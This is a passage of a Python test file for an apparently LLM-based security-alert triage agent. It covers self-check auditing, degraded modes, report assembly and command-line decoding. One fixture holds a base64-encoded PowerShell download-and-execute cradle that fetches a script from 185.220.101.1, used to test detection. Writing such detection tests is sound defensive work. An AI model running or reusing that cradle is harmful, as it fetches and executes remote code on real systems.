    assert analyst._degraded_reasons == ["self-check flagged 1 unsupported claim(s)"]


def test_step_self_check_falls_back_to_escalate_when_all_actions_dropped():
    draft = DraftReportCanonical(
        alert_summary="x", rationale="y", recommended_actions=[RecommendedAction.BLOCK_SOURCE_IP],
    )
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=False),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.OTHER, 0, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    assert corrected.recommended_actions == [RecommendedAction.ESCALATE_TO_HUMAN_ANALYST]


def test_step_self_check_re_adds_escalate_even_if_it_was_the_dropped_action():
    draft = DraftReportCanonical(
        alert_summary="x", rationale="y", recommended_actions=[RecommendedAction.ESCALATE_TO_HUMAN_ANALYST],
    )
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.ESCALATE_TO_HUMAN_ANALYST.value, supported=False),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.OTHER, 0, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    assert corrected.recommended_actions == [RecommendedAction.ESCALATE_TO_HUMAN_ANALYST]


def test_step_self_check_notes_unsupported_claim_without_correction():
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=False, correction=None),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    assert corrected.alert_summary == draft.alert_summary  # kept as-is, best effort
    assert f"unsupported claim: {draft.alert_summary!r}" in notes


def test_step_self_check_notes_errored_and_unknown_enrichments():
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")
    enrichment_results = [
        _make_enrichment_result(error="rate_limited"),
        _make_enrichment_result(verdict=EnrichmentVerdict.UNKNOWN),
    ]

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, enrichment_results, risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    assert "2 enrichment lookup(s) errored or returned unknown verdicts" in notes


def test_step_self_check_notes_unused_correlation_menu():
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")
    unused_correlate_step = InvestigationStep(
        step_name=Step.CORRELATE.value, action="completed", tool_used="siem_connector+llm", input=None,
        output_summary="pattern_type=brute_force, evidence_count=14",  # no "follow-up" or "open-value search" text
        timestamp=datetime.now(timezone.utc),
    )

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        unused_correlate_step, model_available=True,
    )

    assert "correlation follow-up/open-value search menu was not used" in notes


def test_step_self_check_notes_missing_mitre_mapping():
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()  # _make_alert's defaults never set `mitre`, so it defaults to None
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    assert "no MITRE ATT&CK mapping available for this alert" in notes


def test_step_self_check_falls_back_when_call_fails():
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(error=LLMClientError("timeout", "took too long"))
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    assert corrected == draft
    assert "self-check could not run: timeout" in notes
    assert step.action == "degraded"
    assert analyst._degraded_reasons == ["self-check failed: timeout"]


def test_step_self_check_falls_back_when_audit_count_mismatches_claim_count():
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[ClaimAudit(claim=draft.alert_summary, supported=True)])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    assert corrected == draft
    assert step.action == "degraded"
    assert "self-check audit count did not match claim count" in notes
    assert analyst._degraded_reasons == ["self-check returned a mismatched audit count"]


def test_step_self_check_skips_when_model_unavailable():
    draft = _draft_with_two_actions()
    analyst = _make_analyst()
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.OTHER, 0, [], risk_assessment,
        _passthrough_correlate_step(), model_available=False,
    )

    assert corrected == draft
    assert "self-check skipped: model unavailable" in notes
    assert step.action == "skipped"


def test_self_check_prompt_contains_draft_alert_summary():
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    self_check_prompt = next(p for p, schema in llm_client.calls if schema is SelfCheckResult)
    assert draft.alert_summary in self_check_prompt


def test_step_self_check_passes_command_context_to_prompt():
    from app.schemas import CommandDecodeResult, DecodedSegment

    command_context = CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami http://185.220.101.1")],
    )
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True, command_context=command_context,
    )

    self_check_prompt = next(p for p, schema in llm_client.calls if schema is SelfCheckResult)
    assert "185.220.101.1" in self_check_prompt


def test_investigate_runs_full_pipeline_and_persists_report(tmp_path):
    engine = get_engine(str(tmp_path / "test.db"))
    init_db(engine)
    alert_store = SQLiteAlertStore(engine)
    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5", source_ip="203.0.113.5")
    alert_store.save_raw_alert(alert)

    registry = EnrichmentRegistry()
    registry.register(_FakeIPProvider(result=_make_enrichment_result()))
    siem = _FakeSIEMConnector(
        agent_context=AgentContext(id="001", name="web-01", ip="10.0.0.5", status="active"),
        rule_metadata=RuleMetadata(rule_id="5710", description="x", level=5),
        search_results={"data.srcip": SearchResult(alerts=[], total_count=1), "rule.id": SearchResult(alerts=[], total_count=1)},
    )
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            ExtractedIndicators: ExtractedIndicators(candidates=[]),
            CorrelationDecision: CorrelationDecision(
                pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.NONE_NEEDED
            ),
            RiskAssessment: RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x"),
            DraftReportCanonical: DraftReportCanonical(
                alert_summary="Brute-force login attempts detected from 203.0.113.5 against web-01.",
                rationale="High confidence based on repeated failed logins and a known-malicious source IP.",
                recommended_actions=[RecommendedAction.BLOCK_SOURCE_IP, RecommendedAction.DISABLE_OR_RESET_ACCOUNT],
            ),
            DraftReportExperimental: DraftReportExperimental(
                recommended_actions_freeform=["Consider geo-blocking the source region"],
                triage_verdict=TriageVerdict.TRUE_POSITIVE,
                triage_rationale="Pattern matches a known brute-force signature.",
            ),
            SelfCheckResult: SelfCheckResult(audits=[
                ClaimAudit(claim="Brute-force login attempts detected from 203.0.113.5 against web-01.", supported=True),
                ClaimAudit(claim="High confidence based on repeated failed logins and a known-malicious source IP.", supported=True),
                ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
                ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
            ]),
        },
    )
    analyst = AgenticAnalyst(
        siem=siem, alert_store=alert_store, enrichment_registry=registry, llm_client=llm_client,
    )

    report = analyst.investigate(alert)

    step_names = [s.step_name for s in report.investigation_timeline]
    assert step_names == [
        Step.INGEST_AND_PARSE.value,
        Step.EXTRACT_INDICATORS.value,
        Step.ENRICH.value,
        Step.GATHER_CONTEXT.value,
        Step.CORRELATE.value,
        Step.RISK_ASSESSMENT.value,
        Step.DRAFT_REPORT.value,
        Step.SELF_CHECK.value,
        Step.FINALIZE_AND_PERSIST.value,
    ]
    assert report.status == ReportStatus.COMPLETE
    assert report.alert_summary == "Brute-force login attempts detected from 203.0.113.5 against web-01."
    assert report.risk_assessment.severity == Severity.HIGH
    assert report.risk_assessment.confidence == Confidence.HIGH
    assert report.risk_assessment.rationale == "High confidence based on repeated failed logins and a known-malicious source IP."
    assert report.recommended_actions == [
        RecommendedAction.BLOCK_SOURCE_IP.value, RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value,
    ]
    assert report.triage_verdict_experimental == "true_positive"
    assert report.model_metadata.model_name == "gemma4:12b"
    assert report.model_metadata.prompt_version == "4d-v1"
    assert len(report.enrichment_findings) == 1
    assert alert_store.get_report(str(report.report_id)).report_id == report.report_id
    assert alert_store.get_alert(str(alert.alert_id)).status == AlertStatus.INVESTIGATED


def test_investigate_degrades_gracefully_when_model_unavailable(tmp_path):
    engine = get_engine(str(tmp_path / "test.db"))
    init_db(engine)
    alert_store = SQLiteAlertStore(engine)
    alert = _make_alert(full_log="nothing interesting here")
    alert_store.save_raw_alert(alert)

    analyst = AgenticAnalyst(
        siem=_FakeSIEMConnector(
            agent_context=AgentContext(id="001", name="web-01", ip="10.0.0.5", status="active"),
            rule_metadata=RuleMetadata(rule_id="5710", description="x", level=5),
        ),
        alert_store=alert_store,
        enrichment_registry=EnrichmentRegistry(),
        llm_client=_FakeLLMClient(model_available=False),
    )

    report = analyst.investigate(alert)

    correlate_step = next(s for s in report.investigation_timeline if s.step_name == Step.CORRELATE.value)
    assert correlate_step.action == "completed"  # canonical searches still ran
    assert "classification skipped" in correlate_step.output_summary

    risk_step = next(s for s in report.investigation_timeline if s.step_name == Step.RISK_ASSESSMENT.value)
    assert risk_step.action == "skipped"

    stub_step_names = {Step.DRAFT_REPORT.value, Step.SELF_CHECK.value}
    stub_steps = [s for s in report.investigation_timeline if s.step_name in stub_step_names]
    assert all(s.action == "skipped" for s in stub_steps)
    assert report.enrichment_findings == []
    assert report.model_metadata.model_name == "none"


def test_investigate_degrades_gracefully_when_siem_context_unavailable(tmp_path):
    engine = get_engine(str(tmp_path / "test.db"))
    init_db(engine)
    alert_store = SQLiteAlertStore(engine)
    alert = _make_alert(full_log="nothing interesting here")
    alert_store.save_raw_alert(alert)

    analyst = AgenticAnalyst(
        siem=_FakeSIEMConnector(context_error=SIEMConnectorError("unreachable", "connection refused")),
        alert_store=alert_store,
        enrichment_registry=EnrichmentRegistry(),
        llm_client=_FakeLLMClient(
            model_available=True,
            responses={
                ExtractedIndicators: ExtractedIndicators(candidates=[]),
                CorrelationDecision: CorrelationDecision(
                    pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.NONE_NEEDED
                ),
                RiskAssessment: RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x"),
                DraftReportCanonical: DraftReportCanonical(
                    alert_summary="Brute-force login attempts detected from 203.0.113.5 against web-01.",
                    rationale="High confidence based on repeated failed logins and a known-malicious source IP.",
                    recommended_actions=[RecommendedAction.BLOCK_SOURCE_IP, RecommendedAction.DISABLE_OR_RESET_ACCOUNT],
                ),
                DraftReportExperimental: DraftReportExperimental(
                    recommended_actions_freeform=["Consider geo-blocking the source region"],
                    triage_verdict=TriageVerdict.TRUE_POSITIVE,
                    triage_rationale="Pattern matches a known brute-force signature.",
                ),
                SelfCheckResult: SelfCheckResult(audits=[
                    ClaimAudit(claim="Brute-force login attempts detected from 203.0.113.5 against web-01.", supported=True),
                    ClaimAudit(claim="High confidence based on repeated failed logins and a known-malicious source IP.", supported=True),
                    ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
                    ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
                ]),
            },
        ),
    )

    report = analyst.investigate(alert)

    context_step = next(s for s in report.investigation_timeline if s.step_name == Step.GATHER_CONTEXT.value)
    assert context_step.action == "degraded"
    assert report.status == ReportStatus.NEEDS_HUMAN_REVIEW


def test_step_enrich_degrades_when_no_provider_registered_for_type():
    analyst = _make_analyst(enrichment_registry=EnrichmentRegistry())
    indicators, _, _ = analyst._step_extract_indicators(
        _make_alert(full_log="Invalid user admin from 203.0.113.5"), model_available=False
    )

    results, step = analyst._step_enrich(indicators)

    assert len(results) == 1
    assert results[0].verdict == EnrichmentVerdict.UNKNOWN
    assert results[0].error == "no_provider_registered"
    assert step.action == "completed"


def test_investigate_degrades_gracefully_when_alert_not_yet_saved(tmp_path):
    engine = get_engine(str(tmp_path / "test.db"))
    init_db(engine)
    alert_store = SQLiteAlertStore(engine)
    alert = _make_alert(full_log="nothing interesting here")
    # Deliberately NOT calling alert_store.save_raw_alert(alert) first, so
    # update_alert_status will raise AlertNotFoundError.

    analyst = AgenticAnalyst(
        siem=_FakeSIEMConnector(
            agent_context=AgentContext(id="001", name="web-01", ip="10.0.0.5", status="active"),
            rule_metadata=RuleMetadata(rule_id="5710", description="x", level=5),
        ),
        alert_store=alert_store,
        enrichment_registry=EnrichmentRegistry(),
        llm_client=_FakeLLMClient(
            model_available=True,
            responses={
                ExtractedIndicators: ExtractedIndicators(candidates=[]),
                CorrelationDecision: CorrelationDecision(
                    pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.NONE_NEEDED
                ),
                RiskAssessment: RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x"),
                DraftReportCanonical: DraftReportCanonical(
                    alert_summary="Brute-force login attempts detected from 203.0.113.5 against web-01.",
                    rationale="High confidence based on repeated failed logins and a known-malicious source IP.",
                    recommended_actions=[RecommendedAction.BLOCK_SOURCE_IP, RecommendedAction.DISABLE_OR_RESET_ACCOUNT],
                ),
                DraftReportExperimental: DraftReportExperimental(
                    recommended_actions_freeform=["Consider geo-blocking the source region"],
                    triage_verdict=TriageVerdict.TRUE_POSITIVE,
                    triage_rationale="Pattern matches a known brute-force signature.",
                ),
                SelfCheckResult: SelfCheckResult(audits=[
                    ClaimAudit(claim="Brute-force login attempts detected from 203.0.113.5 against web-01.", supported=True),
                    ClaimAudit(claim="High confidence based on repeated failed logins and a known-malicious source IP.", supported=True),
                    ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
                    ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
                ]),
            },
        ),
    )

    report = analyst.investigate(alert)

    finalize_step = report.investigation_timeline[-1]
    assert finalize_step.step_name == Step.FINALIZE_AND_PERSIST.value
    assert finalize_step.action == "degraded"
    # The report itself was still persisted even though the alert-status update failed,
    # since save_report() runs before update_alert_status() inside the same try block.
    assert alert_store.get_report(str(report.report_id)).report_id == report.report_id


def test_investigate_handles_multiple_simultaneous_degradations(tmp_path):
    engine = get_engine(str(tmp_path / "test.db"))
    init_db(engine)
    alert_store = SQLiteAlertStore(engine)
    alert = _make_alert(full_log="nothing interesting here")
    alert_store.save_raw_alert(alert)

    analyst = AgenticAnalyst(
        siem=_FakeSIEMConnector(context_error=SIEMConnectorError("unreachable", "connection refused")),
        alert_store=alert_store,
        enrichment_registry=EnrichmentRegistry(),
        llm_client=_FakeLLMClient(model_available=False),
    )

    report = analyst.investigate(alert)

    assert len(report.investigation_timeline) == 9
    assert report.risk_assessment is not None
    assert report.model_metadata is not None
    context_step = next(s for s in report.investigation_timeline if s.step_name == Step.GATHER_CONTEXT.value)
    assert context_step.action == "degraded"
    finalize_step = report.investigation_timeline[-1]
    assert finalize_step.action == "completed"


def test_step_gather_context_degrades_marks_investigation_degraded():
    siem = _FakeSIEMConnector(context_error=SIEMConnectorError("unreachable", "connection refused"))
    analyst = _make_analyst(siem=siem)
    alert = _make_alert()

    analyst._step_gather_context(alert)

    assert analyst._degraded_reasons == ["SIEM context unavailable: unreachable"]


def test_step_risk_assessment_llm_failure_marks_investigation_degraded():
    llm_client = _FakeLLMClient(model_available=True, error=LLMClientError("timeout", "took too long"))
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()

    analyst._step_risk_assessment(alert, PatternType.OTHER, 0, [], model_available=True)

    assert analyst._degraded_reasons == ["risk assessment failed: timeout"]


def test_assemble_report_status_complete_when_nothing_degraded(tmp_path):
    analyst = _make_analyst()
    alert = _make_alert()
    draft = _draft_with_two_actions()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    report = analyst._assemble_report(
        alert, [], [], risk_assessment, draft, None, "", model_available=True,
    )

    assert report.status == ReportStatus.COMPLETE
    assert report.alert_summary == draft.alert_summary
    assert report.risk_assessment.rationale == draft.rationale
    assert report.recommended_actions == [a.value for a in draft.recommended_actions]
    assert report.model_metadata.prompt_version == "4d-v1"


def test_assemble_report_status_needs_human_review_when_degraded():
    analyst = _make_analyst()
    analyst._degraded_reasons.append("risk assessment failed: timeout")
    alert = _make_alert()
    draft = _draft_with_two_actions()
    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")

    report = analyst._assemble_report(alert, [], [], risk_assessment, draft, None, "", model_available=True)

    assert report.status == ReportStatus.NEEDS_HUMAN_REVIEW


def test_assemble_report_includes_experimental_fields_when_present():
    analyst = _make_analyst()
    alert = _make_alert()
    draft = _draft_with_two_actions()
    experimental = DraftReportExperimental(
        recommended_actions_freeform=["do X"], triage_verdict=TriageVerdict.FALSE_POSITIVE, triage_rationale="y",
    )
    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")

    report = analyst._assemble_report(alert, [], [], risk_assessment, draft, experimental, "", model_available=True)

    assert report.recommended_actions_freeform_experimental == ["do X"]
    assert report.triage_verdict_experimental == "false_positive"
    assert report.triage_rationale_experimental == "y"


def test_assemble_report_includes_command_analysis_when_present():
    from app.schemas import CommandDecodeResult, DecodedSegment

    analyst = _make_analyst()
    alert = _make_alert()
    draft = _draft_with_two_actions()
    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")
    command_analysis = CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami")],
    )

    report = analyst._assemble_report(
        alert, [], [], risk_assessment, draft, None, "", model_available=True, command_analysis=command_analysis,
    )

    assert report.command_analysis.decoded_segments[0].decoded == "whoami"


def test_assemble_report_command_analysis_defaults_to_none():
    analyst = _make_analyst()
    alert = _make_alert()
    draft = _draft_with_two_actions()
    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")

    report = analyst._assemble_report(alert, [], [], risk_assessment, draft, None, "", model_available=True)

    assert report.command_analysis is None


def test_step_extract_indicators_logs_input_and_output(caplog):
    analyst = _make_analyst()
    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")

    with caplog.at_level(logging.DEBUG, logger="app.agent.state_graph"):
        analyst._step_extract_indicators(alert, model_available=False)

    assert "_step_extract_indicators input" in caplog.text
    assert str(alert.alert_id) in caplog.text
    assert "_step_extract_indicators output" in caplog.text
    assert "203.0.113.5" in caplog.text


def test_step_enrich_logs_input_and_output(caplog):
    registry = EnrichmentRegistry()
    registry.register(_FakeIPProvider(result=_make_enrichment_result()))
    analyst = _make_analyst(enrichment_registry=registry)
    indicators, _, _ = analyst._step_extract_indicators(
        _make_alert(full_log="Invalid user admin from 203.0.113.5"), model_available=False
    )

    with caplog.at_level(logging.DEBUG, logger="app.agent.state_graph"):
        analyst._step_enrich(indicators)

    assert "_step_enrich input" in caplog.text
    assert "203.0.113.5" in caplog.text
    assert "_step_enrich output" in caplog.text


def test_step_gather_context_logs_input_and_output(caplog):
    siem = _FakeSIEMConnector(
        agent_context=AgentContext(id="001", name="web-01", ip="10.0.0.5", status="active"),
        rule_metadata=RuleMetadata(rule_id="5710", description="x", level=5),
    )
    analyst = _make_analyst(siem=siem)
    alert = _make_alert()

    with caplog.at_level(logging.DEBUG, logger="app.agent.state_graph"):
        analyst._step_gather_context(alert)

    assert "_step_gather_context input" in caplog.text
    assert "001" in caplog.text
    assert "_step_gather_context output" in caplog.text
    assert "web-01" in caplog.text


def test_step_self_check_logs_input_and_output(caplog):
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    with caplog.at_level(logging.DEBUG, logger="app.agent.state_graph"):
        analyst._step_self_check(
            alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
            _passthrough_correlate_step(), model_available=True,
        )

    assert "_step_self_check input" in caplog.text
    assert "_run_self_check prompt" in caplog.text
    assert "_run_self_check result" in caplog.text
    assert "_step_self_check output" in caplog.text


def test_investigate_decodes_command_line_and_enriches_embedded_ioc(tmp_path):
    from app.schemas import ProcessExecutionFields

    engine = get_engine(str(tmp_path / "test.db"))
    init_db(engine)
    alert_store = SQLiteAlertStore(engine)
    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
    alert = _make_alert(
        rule_id="92009",
        rule_description="Sysmon - process creation via encoded PowerShell command",
        full_log="",
        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
    )
    alert_store.save_raw_alert(alert)

    registry = EnrichmentRegistry()
    registry.register(_FakeIPProvider(result=_make_enrichment_result(
        indicator_value="185.220.101.1", verdict=EnrichmentVerdict.MALICIOUS,
    )))
    siem = _FakeSIEMConnector(
        agent_context=AgentContext(id="003", name="WIN-DESKTOP01", ip="172.20.10.5", status="active"),
        rule_metadata=RuleMetadata(rule_id="92009", description="x", level=12),
    )
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            ExtractedIndicators: ExtractedIndicators(candidates=[]),
            CorrelationDecision: CorrelationDecision(
                pattern_type=PatternType.OTHER, follow_up_query=SearchTemplate.NONE_NEEDED
            ),
            OpenValueSearchProposal: OpenValueSearchProposal(search_value="185.220.101.1"),
            RiskAssessment: RiskAssessment(
                severity=Severity.HIGH, confidence=Confidence.HIGH,
                rationale="Encoded PowerShell command downloads a script from a known-malicious IP.",
            ),
            DraftReportCanonical: DraftReportCanonical(
                alert_summary="Encoded PowerShell process creation contacting a malicious IP.",
                rationale="The decoded command line downloads and executes a remote script.",
                recommended_actions=[RecommendedAction.TERMINATE_SUSPICIOUS_PROCESS, RecommendedAction.ISOLATE_HOST],
            ),
            DraftReportExperimental: DraftReportExperimental(
                recommended_actions_freeform=["Block the IP at the perimeter"],
                triage_verdict=TriageVerdict.TRUE_POSITIVE,
                triage_rationale="Encoded download-and-execute pattern against a malicious IP.",
            ),
            SelfCheckResult: SelfCheckResult(audits=[
                ClaimAudit(claim="Encoded PowerShell process creation contacting a malicious IP.", supported=True),
                ClaimAudit(claim="The decoded command line downloads and executes a remote script.", supported=True),
                ClaimAudit(claim=RecommendedAction.TERMINATE_SUSPICIOUS_PROCESS.value, supported=True),
                ClaimAudit(claim=RecommendedAction.ISOLATE_HOST.value, supported=True),
            ]),
        },
    )
    analyst = AgenticAnalyst(siem=siem, alert_store=alert_store, enrichment_registry=registry, llm_client=llm_client)

    report = analyst.investigate(alert)

    assert report.command_analysis is not None
    assert len(report.command_analysis.decoded_segments) == 1
    assert "185.220.101.1" in report.command_analysis.decoded_segments[0].decoded
    assert any(
        f.indicator_value == "185.220.101.1" and f.verdict == EnrichmentVerdict.MALICIOUS
        for f in report.enrichment_findings
    )
    assert report.status == ReportStatus.COMPLETE

    risk_prompt = next(p for p, schema in llm_client.calls if schema is RiskAssessment)
    assert "185.220.101.1" in risk_prompt


def test_investigate_non_process_alert_is_fully_unaffected(tmp_path):
    """Regression: an alert with no process fields behaves identically to before this feature."""
    engine = get_engine(str(tmp_path / "test.db"))
    init_db(engine)
    alert_store = SQLiteAlertStore(engine)
    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5", source_ip="203.0.113.5")
    alert_store.save_raw_alert(alert)

    registry = EnrichmentRegistry()
    registry.register(_FakeIPProvider(result=_make_enrichment_result()))
    siem = _FakeSIEMConnector(
        agent_context=AgentContext(id="001", name="web-01", ip="10.0.0.5", status="active"),
        rule_metadata=RuleMetadata(rule_id="5710", description="x", level=5),
        search_results={"data.srcip": SearchResult(alerts=[], total_count=1), "rule.id": SearchResult(alerts=[], total_count=1)},
    )
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            ExtractedIndicators: ExtractedIndicators(candidates=[]),
            CorrelationDecision: CorrelationDecision(
                pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.NONE_NEEDED
            ),
            RiskAssessment: RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x"),
            DraftReportCanonical: DraftReportCanonical(
                alert_summary="Brute-force login attempts detected from 203.0.113.5 against web-01.",
                rationale="High confidence based on repeated failed logins and a known-malicious source IP.",
